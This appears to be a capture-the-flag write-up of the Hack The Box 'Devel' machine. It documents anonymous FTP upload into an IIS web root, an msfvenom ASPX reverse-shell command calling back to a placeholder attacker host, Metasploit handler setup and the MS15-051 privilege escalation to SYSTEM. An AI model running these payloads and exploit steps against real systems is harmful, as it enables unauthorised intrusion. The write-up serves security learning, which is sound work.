# Hack The Box - Devel

## Overview

**Machine:** Devel  
**Platform:** Hack The Box  
**Operating System:** Windows  
**Difficulty:** Easy  

Devel is a Windows machine that demonstrates how an insecure FTP configuration can be chained with an IIS web server to achieve remote code execution.

The attack path involved identifying anonymous FTP access, confirming that uploaded files were accessible through the web server, uploading an ASPX Meterpreter payload, obtaining an initial low-privileged shell, and escalating privileges to `NT AUTHORITY\SYSTEM`.

---

## Enumeration

I began by performing an Nmap scan against the target.

```bash
nmap -sC -sV <TARGET_IP>
```

The scan revealed several important services, most notably:

- FTP on port 21
- HTTP on port 80
- Microsoft IIS
- Anonymous FTP login enabled

Anonymous FTP access immediately stood out because unrestricted file access can become significantly more dangerous if the FTP directory overlaps with a web server directory.

<img width="1066" height="562" alt="image" src="https://github.com/user-attachments/assets/240b15a2-35f6-4951-9409-72f3491263a5" />



---

## Anonymous FTP Access

I connected to the FTP service using the anonymous account.

```bash
ftp <TARGET_IP>
```

Username:

```text
anonymous
```

After logging in successfully, I listed the available files.

```text
ls
```

The directory contained:

```text
aspnet_client
iisstart.htm
welcome.png
```

The presence of `iisstart.htm` and `aspnet_client` strongly suggested that the FTP directory might also be the IIS web root.

<img width="1055" height="410" alt="image" src="https://github.com/user-attachments/assets/f58683de-b02f-4300-823e-229fb2c2cdca" />


---

## Testing FTP Write Access

Before attempting to upload any executable content, I created a harmless test file on my attack machine.

```bash
echo "HTB FTP upload test" > test.txt
```

I then uploaded the file through the FTP session.

```text
put test.txt
```

After the transfer completed, I listed the directory again.

```text
ls
```

The uploaded file appeared successfully.

<img width="1055" height="410" alt="image" src="https://github.com/user-attachments/assets/b20de05d-46e2-4270-a143-6604d5e203a5" />

---

## Confirming the FTP Directory Was the IIS Web Root

The next step was to determine whether the uploaded file was accessible through the web server.

I browsed to:

```text
http://<TARGET_IP>/test.txt
```

The browser displayed:

```text
HTB FTP upload test
```

This confirmed that the anonymous FTP directory was also being served directly by IIS.

The relationship was now clear:

```text
Anonymous FTP Access
        |
        v
FTP Write Permissions
        |
        v
IIS Web Root
        |
        v
Uploaded Files Accessible Through HTTP
```

This was the key misconfiguration that enabled remote code execution.

<img width="845" height="385" alt="image" src="https://github.com/user-attachments/assets/e73f548c-55a9-4d05-8d0d-90d60f0e9530" />

---

## Identifying the Executable Web Extension

The server was running Microsoft IIS with ASP.NET support.

Because ASP.NET files can be executed by IIS, the relevant server-side extension was:

```text
aspx
```

This meant an ASPX payload could potentially be uploaded through FTP and executed through the web server.

---

## Creating the ASPX Payload

I identified the IP address of my Hack The Box VPN interface.

```bash
ip addr show tun0
```

I then generated a Meterpreter ASPX reverse shell using `msfvenom`.

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=<ATTACKER_IP> \
LPORT=4444 \
-f aspx \
-o shell.aspx
```

The payload was configured to connect back to my attack machine over port `4444`.

<img width="1088" height="276" alt="image" src="https://github.com/user-attachments/assets/5c9fe29e-3373-42cc-b2cd-ad9aa44bf33f" />


---

## Uploading the ASPX Payload

I returned to the anonymous FTP session and uploaded the generated payload.

```text
put shell.aspx
```

I then verified that the file existed on the server.

```text
ls
```

<img width="1052" height="313" alt="image" src="https://github.com/user-attachments/assets/ae9cce9c-d8da-423a-baf6-dc08326c1217" />


---

## Configuring the Metasploit Handler

Before triggering the ASPX file, I configured a Metasploit multi-handler to receive the reverse connection.

```text
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
show options
run
```

Once the handler was listening, I triggered the uploaded ASPX file through the browser.

```text
http://<TARGET_IP>/shell.aspx
```

IIS executed the ASPX payload and a Meterpreter session connected back to my system.

<img width="1073" height="262" alt="image" src="https://github.com/user-attachments/assets/668262ac-234f-49eb-ae5a-3598c6aeb118" />


## Initial Access

Once the Meterpreter session was established, I checked the current user context.

```text
getuid
```

The session was running as:

```text
IIS APPPOOL\Web
```

This confirmed that remote code execution had been achieved, but the session was still running under a low-privileged IIS application pool account.

I also reviewed the available privileges.

```text
getprivs
```

<img width="610" height="322" alt="image" src="https://github.com/user-attachments/assets/251ea302-079b-45da-915a-1ecd4cb77bc6" />



## Privilege Escalation Enumeration

Rather than immediately trying random privilege escalation exploits, I backgrounded the Meterpreter session.

```text
background
```

I then used Metasploit's local exploit suggester.

```text
use post/multi/recon/local_exploit_suggester
set SESSION <SESSION_ID>
run
```

The module returned several possible privilege escalation paths.

Some modules were marked with messages indicating that the target appeared vulnerable.

<img width="1097" height="586" alt="image" src="https://github.com/user-attachments/assets/2837af38-1ee3-410b-bf44-1d074a955ef1" />


## Checking System Information

Before selecting an exploit, I returned to the Meterpreter session.

```text
sessions -i <SESSION_ID>
```

I then checked the system information.

```text
sysinfo
```

The target was identified as:

```text
OS           : Windows 7
Build        : 7600
Architecture : x86
Meterpreter  : x86/windows
```

This information was important because not every exploit suggested by Metasploit would necessarily be compatible with the target operating system or architecture.

<img width="1078" height="247" alt="image" src="https://github.com/user-attachments/assets/09ffb657-06f0-4338-b8d2-40062df6769b" />


## Selecting a Privilege Escalation Exploit

One of the modules identified by the local exploit suggester was:

```text
exploit/windows/local/ms15_051_client_copy_image
```

The module was marked as potentially vulnerable by Metasploit and was compatible with the Windows 7 x86 environment.

I backgrounded the original Meterpreter session.

```text
background
```

I then configured the exploit.

```text
use exploit/windows/local/ms15_051_client_copy_image
set SESSION <SESSION_ID>
set LHOST <ATTACKER_IP>
set LPORT 4445
show options
run
```

A separate listener port was used for the new privileged session.

<img width="1080" height="607" alt="image" src="https://github.com/user-attachments/assets/e6607a0e-4f08-4a3b-9eee-1e8aa42c4de0" />


## Privilege Escalation to SYSTEM

The exploit completed successfully and opened a new Meterpreter session.

I checked the current security context.

```text
getuid
```

The new session returned:

```text
NT AUTHORITY\SYSTEM
```

Privilege escalation was successful.

<img width="350" height="50" alt="image" src="https://github.com/user-attachments/assets/ca415d5f-26bb-4874-8436-a0511c512208" />


## Flag Retrieval

With SYSTEM-level access, I dropped into a Windows command shell.

```text
shell
```

I then located the user flag on the `babis` user's desktop.

```text
C:\Users\babis\Desktop\
```

The administrator flag was located under:

```text
C:\Users\Administrator\Desktop\
```

The flag values have intentionally been omitted from this write-up.

<img width="476" height="233" alt="image" src="https://github.com/user-attachments/assets/89f20057-e309-4774-9df3-df3c85315ecd" />

<img width="722" height="153" alt="image" src="https://github.com/user-attachments/assets/4c75bdcf-b814-4521-8451-15c94b167971" />



# Attack Path Summary

```text
Nmap Enumeration
        |
        v
Anonymous FTP Access
        |
        v
FTP Write Access
        |
        v
FTP Directory Confirmed as IIS Web Root
        |
        v
ASPX Payload Uploaded
        |
        v
IIS Executes ASPX
        |
        v
Meterpreter Session
        |
        v
IIS APPPOOL\Web
        |
        v
Local Exploit Suggester
        |
        v
System Information Validation
        |
        v
Windows 7 Build 7600 x86
        |
        v
MS15-051
        |
        v
NT AUTHORITY\SYSTEM
```

---

# Key Findings

The primary weakness on Devel was not simply anonymous FTP access.

The larger issue was the combination of several insecure conditions:

- Anonymous FTP authentication was enabled
- Anonymous users had write permissions
- The FTP directory mapped directly to the IIS web root
- IIS supported ASP.NET execution
- The operating system was outdated and vulnerable to local privilege escalation

These issues combined to allow an unauthenticated user to upload executable server-side content, obtain remote code execution, and ultimately escalate privileges to SYSTEM.

---

# Lessons Learned

One of the biggest lessons from this machine was the importance of using system information to validate privilege escalation options before attempting them. The Metasploit local exploit suggester returned a large number of possible exploits and confirming the sysinfo helps mitigate any potential guessing or wasted time. 




